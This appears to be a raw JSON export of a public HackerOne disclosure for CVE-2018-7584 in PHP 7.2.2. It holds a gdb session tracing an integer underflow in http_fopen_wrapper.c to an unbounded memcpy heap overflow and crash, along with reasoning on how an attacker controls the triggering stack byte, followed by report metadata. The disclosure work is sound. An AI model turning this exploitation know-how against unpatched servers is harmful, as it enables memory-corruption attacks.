file_get_contents\\(\\\u0026quot;http://localhost:8888\\\u0026quot;\\)\\;\n\nBreakpoint 1, main (argc=3, argv=0xbfffe9c4) at /home/weilei/php-7.2.2-release/sapi/cli/php_cli.c:1216\n1216            int exit_status = SUCCESS;\n\n(gdb) b http_fopen_wrapper.c:721\nBreakpoint 2 at 0x8424276: file /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c, line 721.\n\n(gdb) c\nContinuing.\n\nBreakpoint 2, php_stream_url_wrap_http_ex (wrapper=0x8d5c0ac \u0026lt;php_stream_http_wrapper\u0026gt;, path=0x8e7cb20 \u0026quot;http://localhost:8888\u0026quot;, mode=0x8c4a516 \u0026quot;rb\u0026quot;, options=0, opened_path=0x0, context=0x8e74970, \n    redirect_max=20, flags=1, response_header=0xbfffb9b0) at /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c:721\n721                             if (tmp_line[tmp_line_len - 1] == \u0026#39;\\n\u0026#39;) {\n\n(gdb) x/10wx tmp_line\n0xbfffaccc:     0x3030000a      0x30303030      0x30303130      0x0000000a\n0xbfffacdc:     0x00000000      0x00000000      0x00000000      0x00000000\n0xbfffacec:     0x00000000      0x00000000\n\n// *** Pre-condition of the large copy: tmp_line[-1] == 0x0d\n// With the zend allocator, it is relatively easier to control the value of tmp_line[-1] to be \u0026#39;\\r\u0026#39;:\n\n722                                     --tmp_line_len;\n(gdb) p tmp_line_len\n$2 = 1\n\n(gdb) n\n723                                     if (tmp_line[tmp_line_len - 1] == \u0026#39;\\r\u0026#39;) {\n\n(gdb) p tmp_line_len\n$3 = 0\n\n// If customised heap allocator is configured for the PHP build, more investigation is needed.\n// On both Linux and Windows, the default configuration is the Zend allocator. For now:\n\n(gdb) set *((char*)tmp_line - 1) = \u0026#39;\\r\u0026#39;\n\n(gdb) x/10bx tmp_line\n0xbfffaccc:     0x0a    0x00    0x30    0x30    0x30    0x30    0x30    0x30\n0xbfffacd4:     0x30    0x31\n\n(gdb) x/10bx tmp_line - 8\n0xbfffacc4:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x0d\n0xbfffaccc:     0x0a    0x00\n\n(gdb) n\n724                                             --tmp_line_len;\n(gdb) n\n727                             ZVAL_STRINGL(\u0026amp;http_response, tmp_line, tmp_line_len);\n\n(gdb) p/x tmp_line_len \n$5 = 0xffffffff\n\n// http_response is a new zval structure declared on the stack, step into line 727\n// a zend_string will be allocated, due to addition of a header and subsequent calls\n// to _ZSTR_STRUCT_SIZE(len) and ZEND_MM_ALIGNED_SIZE(), the allocation size wraps to\n// 16 bytes on the heap.\n\n(gdb) s\nzend_string_init (persistent=0, len=4294967295, str=0xbfffaccc \u0026quot;\\n\u0026quot;) at /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c:727\n727                             ZVAL_STRINGL(\u0026amp;http_response, tmp_line, tmp_line_len);\n\n(gdb) s\nzend_string_alloc (persistent=0, len=4294967295) at /home/weilei/php-7.2.2-release/Zend/zend_string.h:134\n134             zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);\n\n(gdb) p len\n$9 = 4294967295\n\n(gdb) s\n_emalloc (size=16) at /home/weilei/php-7.2.2-release/Zend/zend_alloc.c:2425\n2425            if (UNEXPECTED(AG(mm_heap)-\u0026gt;use_custom_heap)) {\n(gdb) s\n2429                            return AG(mm_heap)-\u0026gt;custom_heap.std._malloc(size);\n(gdb) p size\n$10 = 16\n(gdb) finish\nRun till exit from #0  _emalloc (size=16) at /home/weilei/php-7.2.2-release/Zend/zend_alloc.c:2429\n0x08424336 in zend_string_alloc (persistent=0, len=4294967295) at /home/weilei/php-7.2.2-release/Zend/zend_string.h:134\n134             zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);\nValue returned is $11 = (void *) 0x8e7cf80\n\n// after a few source line stepping:\n\n(gdb) n\n172             memcpy(ZSTR_VAL(ret), str, len);\n\n(gdb) p len\n$17 = 4294967295\n\n(gdb) p/x *ret\n$18 = {gc = {refcount = 0x1, u = {v = {type = 0x6, flags = 0x0, gc_info = 0x0}, type_info = 0x6}}, h = 0x0, len = 0xffffffff, val = {0x18}}\n\n(gdb) x/s str\n0xbfffaccc:     \u0026quot;\\n\u0026quot;\n\n(gdb) s\n__memcpy_ssse3_rep () at ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S:111\n111     ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S: No such file or directory.\n(gdb) bt\n#0  __memcpy_ssse3_rep () at ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S:111\n#1  0x084243bf in zend_string_init (persistent=0, len=4294967295, str=0xbfffaccc \u0026quot;\\n\u0026quot;) at /home/weilei/php-7.2.2-release/Zend/zend_string.h:172\n#2  php_stream_url_wrap_http_ex (wrapper=0x8d5c0ac \u0026lt;php_stream_http_wrapper\u0026gt;, path=0x8e7cb20 \u0026quot;http://localhost:8888\u0026quot;, mode=0x8c4a516 \u0026quot;rb\u0026quot;, options=0, opened_path=0x0, context=0x8e74970, redirect_max=20, \n    flags=1, response_header=0xbfffb9b0) at /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c:727\n#3  0x08425594 in php_stream_url_wrap_http (wrapper=0x8d5c0ac \u0026lt;php_stream_http_wrapper\u0026gt;, path=0x8e7cb20 \u0026quot;http://localhost:8888\u0026quot;, mode=0x8c4a516 \u0026quot;rb\u0026quot;, options=0, opened_path=0x0, context=0x8e74970)\n    at /home/weilei/php-7.2.2-release/ext/standard/http_fopen_wrapper.c:979\n#4  0x0847b77f in _php_stream_open_wrapper_ex (path=0x8e7cb20 \u0026quot;http://localhost:8888\u0026quot;, mode=0x8c4a516 \u0026quot;rb\u0026quot;, options=8, opened_path=0x0, context=0x8e74970)\n    at /home/weilei/php-7.2.2-release/main/streams/streams.c:2027\n#5  0x08388a60 in zif_file_get_contents (execute_data=0xb79ed068, return_value=0xbfffd300) at /home/weilei/php-7.2.2-release/ext/standard/file.c:550\n#6  0x082a42d0 in phar_file_get_contents (execute_data=0xb79ed068, return_value=0xbfffd300) at /home/weilei/php-7.2.2-release/ext/phar/func_interceptors.c:224\n#7  0x08647e4a in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER () at /home/weilei/php-7.2.2-release/Zend/zend_vm_execute.h:573\n#8  execute_ex (ex=0xb79ed028) at /home/weilei/php-7.2.2-release/Zend/zend_vm_execute.h:59731\n#9  0x0865b6a9 in zend_execute (op_array=0x8e7cb40, return_value=0xbfffd474) at /home/weilei/php-7.2.2-release/Zend/zend_vm_execute.h:63760\n#10 0x084da344 in zend_eval_stringl (str=0x8d859a0 \u0026quot;file_get_contents(\\\u0026quot;http://localhost:8888\\\u0026quot;);\u0026quot;, str_len=43, retval_ptr=0x0, string_name=0x8cdc728 \u0026quot;Command line code\u0026quot;)\n    at /home/weilei/php-7.2.2-release/Zend/zend_execute_API.c:1082\n#11 0x084da53e in zend_eval_stringl_ex (str=0x8d859a0 \u0026quot;file_get_contents(\\\u0026quot;http://localhost:8888\\\u0026quot;);\u0026quot;, str_len=43, retval_ptr=0x0, string_name=0x8cdc728 \u0026quot;Command line code\u0026quot;, handle_exceptions=1)\n    at /home/weilei/php-7.2.2-release/Zend/zend_execute_API.c:1123\n#12 0x084da5a6 in zend_eval_string_ex (str=0x8d859a0 \u0026quot;file_get_contents(\\\u0026quot;http://localhost:8888\\\u0026quot;);\u0026quot;, retval_ptr=0x0, string_name=0x8cdc728 \u0026quot;Command line code\u0026quot;, handle_exceptions=1)\n    at /home/weilei/php-7.2.2-release/Zend/zend_execute_API.c:1134\n#13 0x0865e5e0 in do_cli (argc=3, argv=0x8d85950) at /home/weilei/php-7.2.2-release/sapi/cli/php_cli.c:1042\n#14 0x0865f53c in main (argc=3, argv=0x8d85950) at /home/weilei/php-7.2.2-release/sapi/cli/php_cli.c:1404\n\n(gdb) x/8wx $esp\n0xbfffa4cc:     0x084243bf      0x08e7cf90      0xbfffaccc      0xffffffff\n0xbfffa4dc:     0xbfffa59c      0x00000000      0xbfffac9c      0x08e74970\n\n// would result in memcpy(0x08e7cf90, 0xbfffaccc, 0xffffffff);\n\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_ssse3_rep () at ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S:1284\n1284    in ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S\n\n(gdb) info reg\neax            0xbfffffec       -1073741844\necx            0xffffac5f       -21409\nedx            0x8e822b0        149430960\nebx            0xb7e02000       -1210048512\nesp            0xbfffa4c8       0xbfffa4c8\nebp            0xbfffb968       0xbfffb968\nesi            0xb79ed028       -1214328792\nedi            0x8e7cc20        149408800\neip            0xb7d8c497       0xb7d8c497 \u0026lt;__memcpy_ssse3_rep+3431\u0026gt;\neflags         0x10286  [ PF SF IF RF ]\ncs             0x73     115\nss             0x7b     123\nds             0x7b     123\nes             0x7b     123\nfs             0x0      0\ngs             0x33     51\n(gdb) x/10i $eip\n=\u0026gt; 0xb7d8c497 \u0026lt;__memcpy_ssse3_rep+3431\u0026gt;:        movdqu 0x10(%eax),%xmm1\n   0xb7d8c49c \u0026lt;__memcpy_ssse3_rep+3436\u0026gt;:        movdqu 0x20(%eax),%xmm2\n   0xb7d8c4a1 \u0026lt;__memcpy_ssse3_rep+3441\u0026gt;:        movdqu 0x30(%eax),%xmm3\n   0xb7d8c4a6 \u0026lt;__memcpy_ssse3_rep+3446\u0026gt;:        movdqu 0x40(%eax),%xmm4\n   0xb7d8c4ab \u0026lt;__memcpy_ssse3_rep+3451\u0026gt;:        movdqu 0x50(%eax),%xmm5\n   0xb7d8c4b0 \u0026lt;__memcpy_ssse3_rep+3456\u0026gt;:        movdqu 0x60(%eax),%xmm6\n   0xb7d8c4b5 \u0026lt;__memcpy_ssse3_rep+3461\u0026gt;:        movdqu 0x70(%eax),%xmm7\n   0xb7d8c4ba \u0026lt;__memcpy_ssse3_rep+3466\u0026gt;:        lea    0x80(%eax),%eax\n   0xb7d8c4c0 \u0026lt;__memcpy_ssse3_rep+3472\u0026gt;:        lfence \n   0xb7d8c4c3 \u0026lt;__memcpy_ssse3_rep+3475\u0026gt;:        sub    $0x80,%ecx\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-03-06T05:13:02.068Z","updated_at":"2018-03-06T05:13:02.068Z","actor":{"username":"xixabangm4","cleared":false,"url":"/xixabangm4","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2468235,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Correction: the tmp_line[] array is on the stack, hence the pre-condition is determined by attacker's ability to control the byte tmp_line[-1] on stack. Under an -O0 build of PHP-7.2.2 on Ubuntu Linux, the preceding buffer of tmp_line is a zval structure of 16 bytes, defined in Zend/zend_types.h : \n\n```\nstruct _zval_struct {\n\tzend_value        value;\t\t\t/* value */\n\tunion {\n\t\tstruct {\n\t\t\tZEND_ENDIAN_LOHI_4(\n\t\t\t\tzend_uchar    type,\t\t\t/* active type */\n\t\t\t\tzend_uchar    type_flags,\n\t\t\t\tzend_uchar    const_flags,\n\t\t\t\tzend_uchar    reserved)\t    /* call info for EX(This) */\n\t\t} v;\n\t\tuint32_t type_info;\n\t} u1;\n\tunion {\n\t\tuint32_t     next;                 /* hash collision chain */\n\t\tuint32_t     cache_slot;           /* literal cache slot */\n\t\tuint32_t     lineno;               /* line number (for ast nodes) */\n\t\tuint32_t     num_args;             /* arguments number for EX(This) */\n\t\tuint32_t     fe_pos;               /* foreach position */\n\t\tuint32_t     fe_iter_idx;          /* foreach iterator index */\n\t\tuint32_t     access_flags;         /* class constant access flags */\n\t\tuint32_t     property_guard;       /* single property guard */\n\t\tuint32_t     extra;                /* not further specified */\n\t} u2;\n};\n```\nThe zval structure for http_response declared in http_fopen_wrapper.c :\n```\n668\t\tif (php_stream_get_line(stream, tmp_line, sizeof(tmp_line) - 1, \u0026tmp_line_len) != NULL) {\n669\t\t\tzval http_response;\n670\n671\t\t\tif (tmp_line_len \u003e 9) {\n672\t\t\t\tresponse_code = atoi(tmp_line + 9);\n673\t\t\t} else {\n674\t\t\t\tresponse_code = 0;\n675\t\t\t}\n676\t\t\tif (context \u0026\u0026 NULL != (tmpzval = php_stream_context_get_option(context, \"http\", \"ignore_errors\"))) {\n677\t\t\t\tignore_errors = zend_is_true(tmpzval);\n678\t\t\t}\n```\n\nSInce the zval structure is not initialized yet before the pre-condition check at line 723 and initialization of http_response at line 727:\n\n```\n721\t\t\tif (tmp_line[tmp_line_len - 1] == '\\n') {\n722\t\t\t\t--tmp_line_len;\n723\t\t\t\tif (tmp_line[tmp_line_len - 1] == '\\r') {\n724\t\t\t\t\t--tmp_line_len;\n725\t\t\t\t}\n726\t\t\t}\n727\t\t\tZVAL_STRINGL(\u0026http_response, tmp_line, tmp_line_len);\n```\nWe can conclude that the byte at tmp_line[-1] is located on uninitialized stack, therefore an attacker can control this byte by preparing additional calls to flush the byte to '\\x0d' before triggering this vulnerability to arrive at an unbounded heap overflow.","markdown_message":"\u003cp\u003eCorrection: the tmp_line[] array is on the stack, hence the pre-condition is determined by attacker\u0026#39;s ability to control the byte tmp_line[-1] on stack. Under an -O0 build of PHP-7.2.2 on Ubuntu Linux, the preceding buffer of tmp_line is a zval structure of 16 bytes, defined in Zend/zend_types.h : \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003estruct _zval_struct {\n    zend_value        value;            /* value */\n    union {\n        struct {\n            ZEND_ENDIAN_LOHI_4(\n                zend_uchar    type,         /* active type */\n                zend_uchar    type_flags,\n                zend_uchar    const_flags,\n                zend_uchar    reserved)     /* call info for EX(This) */\n        } v;\n        uint32_t type_info;\n    } u1;\n    union {\n        uint32_t     next;                 /* hash collision chain */\n        uint32_t     cache_slot;           /* literal cache slot */\n        uint32_t     lineno;               /* line number (for ast nodes) */\n        uint32_t     num_args;             /* arguments number for EX(This) */\n        uint32_t     fe_pos;               /* foreach position */\n        uint32_t     fe_iter_idx;          /* foreach iterator index */\n        uint32_t     access_flags;         /* class constant access flags */\n        uint32_t     property_guard;       /* single property guard */\n        uint32_t     extra;                /* not further specified */\n    } u2;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe zval structure for http_response declared in http_fopen_wrapper.c :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e668     if (php_stream_get_line(stream, tmp_line, sizeof(tmp_line) - 1, \u0026amp;tmp_line_len) != NULL) {\n669         zval http_response;\n670\n671         if (tmp_line_len \u0026gt; 9) {\n672             response_code = atoi(tmp_line + 9);\n673         } else {\n674             response_code = 0;\n675         }\n676         if (context \u0026amp;\u0026amp; NULL != (tmpzval = php_stream_context_get_option(context, \u0026quot;http\u0026quot;, \u0026quot;ignore_errors\u0026quot;))) {\n677             ignore_errors = zend_is_true(tmpzval);\n678         }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSInce the zval structure is not initialized yet before the pre-condition check at line 723 and initialization of http_response at line 727:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e721         if (tmp_line[tmp_line_len - 1] == \u0026#39;\\n\u0026#39;) {\n722             --tmp_line_len;\n723             if (tmp_line[tmp_line_len - 1] == \u0026#39;\\r\u0026#39;) {\n724                 --tmp_line_len;\n725             }\n726         }\n727         ZVAL_STRINGL(\u0026amp;http_response, tmp_line, tmp_line_len);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe can conclude that the byte at tmp_line[-1] is located on uninitialized stack, therefore an attacker can control this byte by preparing additional calls to flush the byte to \u0026#39;\\x0d\u0026#39; before triggering this vulnerability to arrive at an unbounded heap overflow.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-07T09:29:07.152Z","updated_at":"2018-03-07T09:29:07.152Z","actor":{"username":"xixabangm4","cleared":false,"url":"/xixabangm4","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2622091,"is_internal":false,"editable":false,"type":"Activities::HackerRequestedMediation","message":"Hey, any updates ? Thanks","markdown_message":"\u003cp\u003eHey, any updates ? Thanks\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-17T08:30:32.330Z","updated_at":"2018-04-17T08:30:32.330Z","actor":{"username":"xixabangm4","cleared":false,"url":"/xixabangm4","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2638578,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-19T18:21:05.731Z","updated_at":"2018-04-19T18:21:05.731Z","cve_ids":["CVE-2018-7584"],"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2638579,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-19T18:21:11.895Z","updated_at":"2018-04-19T18:21:11.895Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"xixabangm4","url":"/xixabangm4"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2638581,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-19T18:21:17.109Z","updated_at":"2018-04-19T18:21:17.109Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"xixabangm4","url":"/xixabangm4"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6025848,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:18:26.000Z","updated_at":"2019-10-13T09:18:26.000Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6029470,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-14T04:37:33.670Z","updated_at":"2019-10-14T04:37:33.670Z","actor":{"username":"xixabangm4","cleared":false,"url":"/xixabangm4","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6029471,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-14T04:37:34.552Z","updated_at":"2019-10-14T04:37:34.552Z","actor":{"username":"xixabangm4","cleared":false,"url":"/xixabangm4","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}